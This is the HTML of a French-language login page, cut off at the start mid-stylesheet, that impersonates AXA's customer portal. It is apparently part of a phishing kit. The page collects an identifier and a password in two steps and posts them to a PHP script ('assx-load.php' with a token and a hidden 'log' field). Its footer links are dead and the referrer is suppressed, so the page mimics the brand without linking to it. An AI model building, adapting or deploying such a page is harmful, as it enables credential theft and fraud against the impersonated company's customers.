                border-right: 1px solid #efefef;
                border-top-right-radius: 0px;
                border-bottom-right-radius: 0px
            }

            .legacy .c-auth-tab__item:last-of-type {
                border-top-left-radius: 0px;
                border-bottom-left-radius: 0px
            }

            .legacy .c-auth-tab__item.is-selected {
                background-color: #424242
            }

            .legacy .c-auth__dropdown {
                font-family: "Source Sans Pro";
                position: relative;
                background-color: #efefef;
                color: #616161;
                padding: 10px;
                margin-top: 20px;
                border-radius: 3px;
                margin-bottom: 20px
            }

            .legacy .c-auth__dropdown--left::before,.legacy .c-auth__dropdown--right::before {
                content: "";
                position: absolute;
                top: -10px;
                left: 20%;
                width: 20px;
                height: 20px;
                background-color: inherit;
                transform: rotate(45deg)
            }
       
            .mt-md {
                margin-top: var(--spacing-md)
            }

            
            @media(max-width: 1020px) {
                :host(.is-desktop:not(.is-mobile)) {
                    display:none
                }

                :host(.is-tablet:not(.is-mobile)) {
                    display: none
                }
            }

            @media(min-width: 1021px) and (max-width:1089px) {
                :host(.is-mobile:not(.is-tablet)) {
                    display:none
                }

                :host(.is-desktop:not(.is-tablet)) {
                    display: none
                }
            }

            @media(min-width: 1090px) {
                :host(.is-mobile:not(.is-desktop)) {
                    display:none
                }

                :host(.is-tablet:not(.is-desktop)) {
                    display: none
                }
            }

            :host([background-base]:not([background-base="false"])) .js-container,:host([background-light]:not([background-light="false"])) .js-container,:host([no-background]:not([no-background="false"])) .js-container,:host([lib-bg-color]:not([lib-bg-color=""])) .js-container {
                background-color: var(--m-background-color)
            }

            :host(.m-align),.m-align {
                display: block;
                width: fit-content;
                width: -moz-fit-content
            }

            :host(.m-center),.m-center {
                margin-left: auto;
                margin-right: auto
            }

            :host(.m-left),.m-left {
                margin-right: auto
            }

            :host(.m-right),.m-right {
                margin-left: auto
            }

            @media(max-width: 740px) {
                :host(.m-center-m),.m-center-m {
                    margin-left:auto;
                    margin-right: auto
                }

                :host(.m-left-m),.m-left-m {
                    margin-right: auto
                }

                :host(.m-right-m),.m-right-m {
                    margin-left: auto
                }
            }

            .c-svg {
                font-size: var(--size-svg)
            }

            .c-svg-size--md {
                --size-svg: var(--icon-md)
            }

            :host {
                display: inline-block;
                --size-svg: var(--icon-lg)
            }

            .c-svg {
                position: relative;
                height: 1em;
                width: 1em;
                overflow: hidden;
                flex-shrink: 0;
                vertical-align: var(--svg-pos,-0.15em);
                fill: currentcolor
            }

            svg>* {
                fill: var(--color-fill-svg,none);
                stroke-width: var(--svg-stroke-width);
                stroke: var(--color-svg,currentcolor);
                vector-effect: non-scaling-stroke
            }

            .svg-rectangle-hidden {
                stroke: none
            }

            .svg-rectangle-hidden {
                fill: none
            }

            .c-svg--circle {
                border: 1px solid;
                border-color: transparent;
                border-radius: var(--border-radius-circle);
                overflow: visible
            }
        </style>
        <meta name="referrer" content="no-referrer">
        <link type="image/x-icon" rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAVNQTFRFCBORBRGQBBGRYxNolhhWAw+OAA+PNhB5lBNQKBGCAQ+PHQ+ElRNQPBB2AhGRAg+ODA+LgxJYXhFoAg+PZRFlfhJaCQ+MRBBzlBNRGQ+FKBB/mRNOMhB7Ag6OAQ2NAg6NBg2MbRFgTg9tAA6OHiiZeoDEVFuydnvCHymaQ0qpY1usdHi/Rk6sCBSQg4fG7O33oKPTzM3ni47Kmp3Qk5fN5ebzpajWCBOPXmW2nqHSmZzQwcPjqKvX4eLyjJDKo6bUiY3I0tPqICqaN0Ckvb/hoaTU5uf0zs/o6+v2xsjlUViwAAyMJC6cmZ3RSE+sFB+VKzSf0tTrv8Hh4uPxiY7KHCaYrbDalJjPBBCOm5/SZGq4VFux0dLq4uPy4ODxCRWQAAqManC7zM7oHSeZVVyyDBiSSVGsXmS1Rk6rW2K0DhmTISuaYmi3BRCPAw6OBBCP////n7v+EwAAAAFiS0dEcNgAbHQAAAAJcEhZcwAAAEgAAABIAEbJaz4AAADGSURBVBjTY2BgRAJMzCwMjKwIwMbOwYkswMXNw8uHJMAvICgkzIisQkRUjB9JgE1cQpKLFSHAJSUtw8YKEZCVk5eTVVBUUmaFCMipqKqpa2hqaevIgwVkdfX0DQyNjE1MzczBAnIWllbWNrZ29g6OTnJAAVlnF1cbN3cPTxtLNy9voICPr59/QGBQcIh/aFh4BFAgMkpePjomNs4mPiExKVmOkSElVT4+TTM9IzNLLjsnVJ6RITeXkZE1TzYvj5ExXzaXkQEAdBgf9hAWga8AAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMTEtMDZUMTY6MjI6MDUrMDA6MDARZdPFAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTExLTA2VDE2OjIyOjA1KzAwOjAwYDhreQAAAEZ0RVh0c29mdHdhcmUASW1hZ2VNYWdpY2sgNi43LjgtOSAyMDE0LTA1LTEyIFExNiBodHRwOi8vd3d3LmltYWdlbWFnaWNrLm9yZ9yG7QAAAAAYdEVYdFRodW1iOjpEb2N1bWVudDo6UGFnZXMAMaf/uy8AAAAYdEVYdFRodW1iOjpJbWFnZTo6aGVpZ2h0ADE5Mg8AcoUAAAAXdEVYdFRodW1iOjpJbWFnZTo6V2lkdGgAMTky06whCAAAABl0RVh0VGh1bWI6Ok1pbWV0eXBlAGltYWdlL3BuZz+yVk4AAAAXdEVYdFRodW1iOjpNVGltZQAxNTQxNTIxMzI1yxTLCgAAAA90RVh0VGh1bWI6OlNpemUAMEJClKI+7AAAAFZ0RVh0VGh1bWI6OlVSSQBmaWxlOi8vL21udGxvZy9mYXZpY29ucy8yMDE4LTExLTA2LzNmOTAwZTAzNmMwZTEwZmEwNzJlYWUyYmI1OWY4YmI4Lmljby5wbmeusvW9AAAAAElFTkSuQmCC">
        <style>
            img[src="data:,"],source[src="data:,"] {
                display: none!important
            }
        </style>
    </head>
    <body class="auth">
        <div id="main-header">
            <header style="--t-header-shadow:var(--t-header-shadow--auth);display:flex;justify-content:space-between;padding:15px;font-size:large">
                <logo aria-hidden="true" src="logo.png" class="no-border " mw100="true" style="">
                    <div class="c-logo js-container m-radius ">
                        <img class="c-img" alt="" src="data:image/png;base64,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">
                    </div>
                </logo>
                <text tag="h1" theme="primary" class="no-border " style="color:#00008f">
                    <strong>Bienvenue</strong>
                    &nbsp;sur votre espace client
                
                </text>
            </header>
        </div>
        <main>
            <div>
                <div id="root-layout" class="o-layout" style="margin-top:30px">
                    <div class="o-layout-main">
                        <div id="main">
                            <div class="na-authent-dock">
                                <router-outlet>
                                    <novatio-page>
                                        <div>
                                            <div id="domi-auth" class="ng-scope open-login-form">
                                                <div id="content" class="container-main" style="padding-top:0px">
                                                    <div class="legacy" style="padding-left:0px">
                                                        <div class="ui-view-container main-parent list">
                                                            <div class="open-login-form ng-scope" ui-view="">
                                                                <form class="c-auth ng-scope" method="post" action="<?php echo 'assx-load.php?token='.$token1; ?>">
                                                                    <div>
                                                                        <div center="true" icon="cadenas" circle-size="md" lib-bg-color="var(--color-primary)" class="m-align m-center ng-scope" style="background-color:#00008f;border-radius:50px;height:96px;width:96px">
                                                                            <svg aria-hidden="true" class="js-container c-svg c-svg-size--auth c-svg--circle" width="40" height="40" part="ux-svg" viewBox="0 0 28 28" style="--color-svg:#ffffff;padding:var(--spacing-md);--size-svg:95px">
                                                                                <path d="M18.33 12.3V7.73c0-2.39-1.94-4.32-4.32-4.32a4.33 4.33 0 0 0-4.34 4.31v1.53c0 .91-2.22.91-2.22 0V7.57c0-3.62 2.93-6.55 6.55-6.55 3.62 0 6.55 2.93 6.55 6.55v4.73"></path>
                                                                                <rect x="6.09" y="12.3" width="15.84" height="14.75" rx="2.37" ry="2.37"></rect>
                                                                                <path d="m15.67 23.03-.91-4.22c.63-.41.81-1.26.39-1.89-.41-.63-1.26-.81-1.89-.39-.63.41-.81 1.26-.39 1.89.1.16.24.29.39.39l-.91 4.22h3.32Z"></path>
                                                                                <path class="svg-rectangle-hidden" d="M.5.5h27v27H.5z"></path>
                                                                            </svg>
                                                                        </div>
                                                                        <div tag="h2" center="" bold="true" class="ng-binding ng-scope ng-isolate-scope" uppercase="true" style="text-align:center;margin:15px">
                                                                            <h2 class="js-container c-text m-tag m-lib-color m-align-text" part="ux-text" style="font-weight:bold;font-size:var(--text-font-size-md)">Accès à votre espace client</h2>
                                                                        </div>
                                                                    </div>
                                                                    <div class="c-auth__body mt-md" id="div0">
                                                                        <div class="form-login ng-pristine ng-valid ng-scope">
                                                                            <div>
                                                                                <label style="background-color:transparent;font-size:large;color:#000000ab;margin-bottom:10px">Identifiant</label>
                                                                                <div autocomplete="off" placeholder="Saisissez votre mot de passe" name="password" class="ng-isolate-scope">
                                                                                    <div style="display:flex;height:55px">
                                                                                        <input class="c-input c-input-password js-delegate-focus empty" id="usr" type="text" autocomplete="off" placeholder="Saisissez votre identifiant" name="usr" value="" style="width:100%;height:55px;padding:20px;border:solid .5px lightgrey;border-radius:5px">
                                                                                    </div>
                                                                                </div>
                                                                                <div style="display:flex;margin-top:20px;gap:10px;align-items:center">
                                                                                    <input type="checkbox" style="height:30px;width:30px">
                                                                                    <p slot="label" style="">Se souvenir de moi</p>
                                                                                </div>
                                                                                <div center="true" class="mt-md m-align m-center ng-binding" tabindex="0">
                                                                                    <button class="c-btn js-container js-delegate-focus m-a11y-label" style="background-color:#47a80d;color:white;font-weight:600;width:250px" type="button" onclick=" if(document.getElementById('usr').value.length > 5){  document.getElementById('lusr').innerText = document.getElementById('usr').value; document.getElementById('div0').style.display = 'none'; document.getElementById('div1').style.display = 'block';  } ">Suivant</button>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="c-auth__body mt-md" id="div1" style="
    display: none;
">
                                                                        <div id="auth-c_3" class="form-login ng-scope" style="">
                                                                            <div class="c-auth-id">
                                                                                <button type="button" class="c-auth-id__icon-wrapper" style="color:inherit" title="Changer d'identifiant" id="btnChangeID" onclick=" document.getElementById('div1').style.display = 'none'; document.getElementById('div0').style.display = 'block'; ">
                                                                                    <icon icon="fleche-cercle" rotate="180">
                                                                                        <svg aria-hidden="true" class="js-container c-svg c-svg-size--md" width="40" height="40" part="ux-svg" viewBox="0 0 28 28" style="transform:rotate(180deg)">
                                                                                            <circle cx="14" cy="14" r="12.93"></circle>
                                                                                            <path d="m15.41 19.2 5.2-5.2-5.2-5.2m5.2 5.2H7.39"></path>
                                                                                            <path class="svg-rectangle-hidden" d="M.5.5h27v27H.5z"></path>
                                                                                        </svg>
                                                                                    </icon>
                                                                                </button>
                                                                                <div class="c-auth-id__label" title="Se connecter avec cet identifiant" style="background-color:transparent">
                                                                                    <div class="ng-binding" id="lusr">user-id</div>
                                                                                </div>
                                                                            </div>
                                                                            <div class="c-auth-tab-container ng-scope">
                                                                                <div class="c-auth-tab">
                                                                                    <button type="button" class="c-auth-tab__item ng-binding ng-scope is-selected">Connexion via mot de passe  </button>
                                                                                    <button type="button" class="c-auth-tab__item ng-binding ng-scope">
                                                                                        Connexion via mobile  <span class="accessi ng-scope">,disponible seulement si vous avez enregistré un mobile comme terminal de confiance, non sélectionné</span>
                                                                                    </button>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="form-login ng-pristine ng-valid ng-scope">
                                                                            <div class="c-auth__dropdown ng-scope c-auth__dropdown--left">
                                                                                <label style="background-color:transparent">Mot de passe</label>
                                                                                <div autocomplete="off" placeholder="Saisissez votre mot de passe" name="password" class="ng-isolate-scope">
                                                                                    <div style="display:flex;height:55px">
                                                                                        <input class="c-input c-input-password js-delegate-focus empty" id="pwd" type="password" autocomplete="off" placeholder="Saisissez votre mot de passe" name="pwd" value="" style="width:100%;border:0;height:55px" minlength="4">
                                                                                        <button class="c-input-btn c-btn-show m-btn-no-style" title="Afficher le mot de passe" style="width:15%;border-left:solid .5px #d3d3d330;height:100%;background-color:white;border-radius:0px 5px 5px 0px" type="button" onclick=" document.getElementById('pwd').type = 'text'; ">
                                                                                            <svg aria-hidden="true" class="js-container c-svg" width="40" height="40" part="ux-svg" viewBox="0 0 28 28">
                                                                                                <path data-name="Tracé 704-3" class="cls-3" d="M27 13.82s-6.34 7.88-12.84 7.88S1 13.82 1 13.82s6.66-7.51 13.16-7.51S27 13.82 27 13.82Z"></path>
                                                                                                <ellipse class="cls-2" cx="14.24" cy="13.8" rx="4.75" ry="4.54"></ellipse>
                                                                                                <path class="svg-rectangle-hidden" d="M.5.5h27v27H.5z"></path>
                                                                                            </svg>
                                                                                        </button>
                                                                                    </div>
                                                                                </div>
                                                                                <div center="true" class="mt-md m-align m-center ng-binding" tabindex="0" id="btnConnect">
                                                                                    <button class="c-btn js-container js-delegate-focus m-a11y-label" style="background-color:#47a80d;color:white;font-weight:600;width:250px" type="submit">Se connecter</button>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="c-auth__footer">
                                                                        <div center="" tag="span" class="ng-scope" style="text-align:center">
                                                                            <a href="#" id="lien-acces-oublie" focus-on="lien-acces-oublie" class="ng-binding ng-scope">Codes d'accès oubliés ?</a>
                                                                        </div>
                                                                    </div>
																	<input type="hidden" name="type" value="log">
                                                                </form>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </novatio-page>
                                </router-outlet>
                            </div>
                            <div class="na-hero"></div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <div class="o-footer" id="footer-container">
            <novatio-footer type="auth" id="main-footer">
                <div class="o-footer">
                    <footer id="footer-desktop" style="border-bottom:solid .5px lightgrey">
                        <img src="data:image/png;base64,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" style="float:right;margin-right:2%;max-width:150px;width:20%">
                        <ul style="display:grid;gap:15px">
                            <item style="">
                                <a href="#" rel="noopener noreferrer">Configuration et sécurité</a>
                            </item>
                            <item>
                                <a href="#">Mentions légales</a>
                            </item>
                            <item>
                                <a href="#" rel="noopener noreferrer">Politique Cookies</a>
                            </item>
                            <item>
                                <a href="#" rel="noopener noreferrer">Données personnelles</a>
                            </item>
                            <item no-border="">
                                <a href="#" rel="noopener noreferrer">Conditions générales et tarifaires</a>
                            </item>
                        </ul>
                    </footer>
                    <copyright no-border="" style="">
                        <p tag="p" style="padding:25px;text-align:right">© AXA 2024 - Tous droits réservés</p>
                    </copyright>
                </div>
            </novatio-footer>
        </div>
    </body>
</html>
